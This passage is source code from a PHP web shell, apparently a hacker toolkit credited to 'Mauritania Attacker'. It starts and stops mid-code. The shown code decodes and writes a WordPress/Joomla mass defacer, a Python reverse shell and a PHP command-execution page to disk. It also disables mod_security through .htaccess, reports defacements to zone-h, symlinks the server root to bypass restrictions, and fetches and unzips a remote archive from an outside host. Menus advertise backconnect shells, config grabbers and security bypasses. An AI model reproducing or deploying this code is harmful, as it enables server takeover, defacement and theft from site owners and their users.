HNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KDQppZigkY29uZmlnMDIgJiYgcHJlZ19tYXRjaCgnL0RCX05BTUUvaScsJGNvbmZpZzAyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJ5ZWxsb3ciPldPUkRQUkVTUzwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl93cCgkY29uZmlnMDIsICRkZWYpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJG91dHB1dCwgJ2h0dHA6Ly8nLiRkb21haW4uIjxicj4iKTsNCiRjb3VudDIgPSAkY291bnQyKzE7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQp9DQppZigkY29uZmlnMDMgJiYgcHJlZ19tYXRjaCgnL0RCX05BTUUvaScsJGNvbmZpZzAzKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJ5ZWxsb3ciPldPUkRQUkVTUzwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl93cCgkY29uZmlnMDMsICRkZWYpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJG91dHB1dCwgJ2h0dHA6Ly8nLiRkb21haW4uIjxicj4iKTsNCiRjb3VudDIgPSAkY291bnQyKzE7DQp9IGVsc2UgeyAgICANCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGVjaG8gJzwvdGFibGU+JzsNCiAgICBlY2hvICc8aHIvPic7DQogICAgZWNobyAnVG90YWwgRGVmYWNlZCA9ICcuJGNvdW50MSArICRjb3VudDIuJyAoSk9PTUxBID0gJy4kY291bnQxLicsIFdPUkRQUkVTUyA9ICcuJGNvdW50Mi4nKTxiciAvPic7DQoJZWNobyAnPGEgaHJlZj0iZGVmYWNlZC5odG1sIiB0YXJnZXQ9Il9ibGFuayI+U2hvdyBBbGw8L2E+PGJyIC8+JzsNCn0NCmVsc2Ugew0KZWNobyAnDQo8dGFibGU+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPHRyPg0KCTx0ZD5pbmRleCB1cmwgOiA8L3RkPg0KCTx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNjAiIG5hbWU9InR1bmlzaWEiIHBsYWNlaG9sZGVyPSJwdXQgeW91ciBpbmRleCB1cmwgaGVyZSAhIj48L3RkPg0KPC90cj4NCjx0cj4NCgk8dGQ+dXNlIDogPC90ZD4NCjwvdHI+DQo8dHI+DQoJPHRkPjxpbnB1dCB0eXBlPSJyYWRpbyIgdmFsdWU9IjEiIG5hbWU9Im1vZGUiPjwvdGQ+PHRkPi9ldGMvbmFtZWQuY29uZjwvdGQ+DQo8L3RyPg0KPHRyPg0KCTx0ZD48aW5wdXQgdHlwZT0icmFkaW8iIGNoZWNrZWQ9ImNoZWNrZWQiIHZhbHVlPSIyIiBuYW1lPSJtb2RlIj48L3RkPjx0ZD4vdmFyL25hbWVkPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGJyPjxjZW50ZXI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0idHVuaXNpYV9kZWZhY2UiIHZhbHVlPSJEZWZhY2UiPjwvdGQ+DQo8L3RyPg0KPC9mb3JtPg0KPC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQonOw0KfQ0KPz4=';
$file = fopen("massjmlawrdprsss.php" ,"w+");
$write = fwrite ($file ,base64_decode($gfgf4fff));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Wordpress & Joomla Mass Defacer</font></b><center><br><iframe src=massjmlawrdprsss.php width=75% height=60% frameborder=0></iframe></div></center>"; 
}


// tools
if(isset($_GET['action']) && $_GET['action'] == 'zone-h' && !empty($_POST['hackmode'])){
if($_POST['SendNowToZoneH'])
{
echo '<center>';
ob_start();
$sub = get_loaded_extensions();
if(!in_array("curl", $sub)){die('[-] Curl Is Not Supported !! ');}
$hacker = $_POST['defacer'];
$method = $_POST['hackmode'];
$neden = $_POST['reason'];
$site = $_POST['domain'];
	
if (empty($hacker)){die ("[-] You Must Fill the Attacker name !");}
elseif($method == "--------SELECT--------") {die("[-] You Must Select The Method !");}
elseif($neden == "--------SELECT--------") {die("[-] You Must Select The Reason");}
elseif(empty($site)) {die("[-] You Must Inter the Sites List ! ");}
$i = 0;
$sites = explode("\n", $site);
while($i < count($sites)) 
{
if(substr($sites[$i], 0, 4) != "http") {$sites[$i] = "http://".$sites[$i];}
ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
echo "Site : ".$sites[$i]." Defaced !\n";
++$i;
}
echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
}
echo '</center>';
}
if(isset($_GET['action']) && $_GET['action'] == 'pythnonbakcncete'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';

mkdir('pyrevrshell', 0755);
chdir('pyrevrshell');
$seropil = ".htaccess";
$angelinalll = "$seropil";
$shitttyz = fopen ($angelinalll , 'w') or die ("shitttyz a&#231;&#305;lamad&#305;!");
$dffvfdgfg = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $shitttyz , $dffvfdgfg ) ;
fclose ($shitttyz);
//extract python reverse script
$vkffhd = 'IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';

$jkol = fopen("reversesh.py" ,"w+");
$write = fwrite ($jkol ,base64_decode($vkffhd));
fclose($jkol);
chmod("reversesh.py",0755);

//extract php command shell
$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6ICMyMjIyMjIgIWltcG9ydGFudDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7fSAgICAgIGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEdlbmV2YTsgY29sb3I6IzAwNzcwMDsgcGFkZGluZzoycHggMnB4O30gICAgICBhOmhvdmVye2NvbG9yOiMwMDk5MDA7IHRleHQtc2hhZG93OiMwMGZmMDAgMHB4IDBweCAzcHg7fQkgIC5hcmVhIHsgY29sb3I6ICMwMGJiMDA7IGZvbnQtc2l6ZTogOXB0OyB0ZXh0LXNoYWRvdzojMDAwMDAwIDBweCAycHggN3B4OyBib3JkZXI6IHNvbGlkIDBweCAjMDA3NzAwOyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA5OTAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyB9CSAgaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7ICBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyAgdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsgIGJhY2tncm91bmQ6ICNhZWFlYWU7ICBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyAgYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgIGJvcmRlci1ib3R0b20tY29sb3I6ICMyMjNiNjY7ICBib3JkZXItcmFkaXVzOiA0cHg7ICBjdXJzb3I6IHBvaW50ZXI7ICBiYWNrZ3JvdW5kLWltYWdlOi13ZWJraXQtbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSBpbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzogIzc3Nzc3NyAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc3MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDt9IGlucHV0W3R5cGU9c3VibWl0XTpob3ZlciwgaW5wdXRbdHlwZT10ZXh0XTpob3ZlcnsgY29sb3I6ICNmZmZmZmY7IHRleHQtc2hhZG93OiAjMDA2NjAwIDBweCAwcHggNHB4OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSBzZWxlY3R7IHBhZGRpbmc6IDNweDsgd2lkdGg6IDE2MnB4OyBjb2xvcjogIzAwYWEwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwYWEwMDsgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7fSBzZWxlY3Q6aG92ZXJ7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7ICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gICAjY29tbWFuZHN7IG1hcmdpbi1sZWZ0OiAzNTBweDsgbWFyZ2luLXJpZ2h0OiAzNTBweDsgfSBvcHRpb257IGNvbG9yOiAjNzc3Nzc3OyB9PC9zdHlsZT4NCjw/cGhwDQplY2hvICc8Y2VudGVyPjxmb250IGNvbG9yPSIjMDA3NzAwIiBmYWNlPSJUYWhvbWEiIHN0eWxlPSJmb250LXNpemU6IDEycHQiPlVzYWdlOiByZXZlcnNlc2gucHkgW0hvc3RdIFtQb3J0XTwvZm9udD4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3MTAuMHp6MC5jb20vMjAxNC8wOC8yMC8yMC8yMjU4MTYzNTUucG5nIj48L3A+PGZvbnQgZmFjZT0iR2VuZXZhIiBhbGlnbj0iY2VudGVyIiBzaXplPSIyIiBjb2xvcj0iIzAwOTkwMCI+IENvZGVkIEJ5IE1hdXJpdGFuaWEgQXR0YWNrZXIgPC9mb250Pjxicj4NCjxmb3JtIG1ldGhvZD1nZXQgYWN0aW9uPSInLiRtZS4nIj4NCjxwPjx0ZXh0YXJlYSBjbGFzcz0iYXJlYSIgcm93cz0iMTMiIG5hbWU9IlMxIiBjb2xzPSI3MCIgPic7DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+SWYgbm90aGluZyB3b3JrIGl0IG1lYW5zIHRoYXQgcHl0aG9uIGlzIG5vdCBlbmFibGVkIGluIHRoaXMgc2VydmVyIDooPC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz5Db21tYW5kOiBweXRob24gcmV2ZXJzZS5weSB5b3VySVAgUG9ydDwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQo/Pg==';
$file = fopen("kiter.php" ,"w+");
$write = fwrite ($file ,base64_decode($merdeeeee));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Python Connect Shell Priv8</span><center><center><br><iframe src=pyrevrshell/kiter.php width=75% height=70% frameborder=0></iframe></div></center>'; 
}
if(isset($_GET['action']) && $_GET['action'] == 'rootexecbpass'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';

echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With exec Function</span><center><br>';
mkdir('excrooooot', 0755);
chdir('excrooooot');
$excrooooot = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydleGVjZXInXSkpeyBleGVjKCdsbiAtcyAvIHJvb3QtZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3QtZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3QtZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

$file = fopen("excrooooot.php" ,"w+");
$write = fwrite ($file ,base64_decode($excrooooot));
fclose($file);
chmod("excrooooot.php",0755);
echo "<iframe src=excrooooot/excrooooot.php width=60% height=60% frameborder=0></iframe>";
}
if(isset($_GET['action']) && $_GET['action'] == 'bypsrootwzp'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo'<center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With Zip File</span><br>Coded By Mauritania Attacker</center>';
echo"<p align='center'><img border='0' src='http://4.bp.blogspot.com/-B2RRd3iYCgI/Uj6UtLxxApI/AAAAAAAAATc/DJHEPAWNTmk/s320/Password-protected-zip-file.png'></p>";
echo'<div class="tul"><font color="009900" face="Impact, Geneva, sans-serif" style="font-size: 8pt"><font/>';

echo"<center><font face='ghost' color='red' size='5'><font/>
<form method='post'>
<input type='submit' value='Grab To Root Now' name='fuck'><br>
<center><font color='red' size='4' face='ghost'>Remote Zip File</font><input type='text' size='40' name='shell' value='http://hcp1.es/wp-content/uploads/v4.zip' 
</font></center>
</form>
</center>
</p>";


@error_reporting(0);

$file = $_POST['shell'];
//Generate zip file
mkdir('wooooot', 0755);
chdir('wooooot');
$fopen = fopen("v4.zip",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "Zip File Downloaded Successfully\n";
sleep(2);
echo "<p>Going To Unzip the File to Get r00t....</p>";

sleep(2); 

//system
system('unzip v4.zip');



//passthru
passthru('unzip v4.zip');



//shell_exec
shell_exec('unzip v4.zip');



//exec
exec('unzip v4.zip');


//proc_open
proc_open('unzip v4.zip');




sleep(1);

//Extracting htaccess For Symlink
chdir('wooooot');
$htaccess = 'T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kNCk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcw0KRm9yY2VUeXBlIHRleHQvcGxhaW4NCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIA0KQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sDQpBZGRUeXBlIHRleHQvaHRtbCAuc2h0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAuaHRtbA0KQWRkSGFuZGxlciB0eHQgLnNodG1sDQpPcHRpb25zIEFsbA0KT3B0aW9ucyBBbGw=';
$priv8priv = fopen(".htaccess" ,"w+");
$xwrite = fwrite ($priv8priv ,base64_decode($htaccess));

sleep(1);

echo "<p>Loading Perl unzipper.... \!/ </p>";
//dezipper.pl generate
chdir('wooooot');
$l0vercodee = 'eyANCnN5c3RlbSgidW56aXAgdjQuemlwIik7DQpleGVjKCJ1bnppcCB2NC56aXAiKTsNCnBhc3N0aHJ1KCJ1bnppcCB2NC56aXAiKTsNCnNoZWxsX2V4ZWMoInVuemlwIHY0LnppcCIpOw0KcHJvY19vcGVuKCJ1bnppcCB2NC56aXAiKTsNCn0=';
$greatshiit = fopen("dezipper.pl" ,"w+");
$write = fwrite ($greatshiit ,base64_decode($l0vercodee));
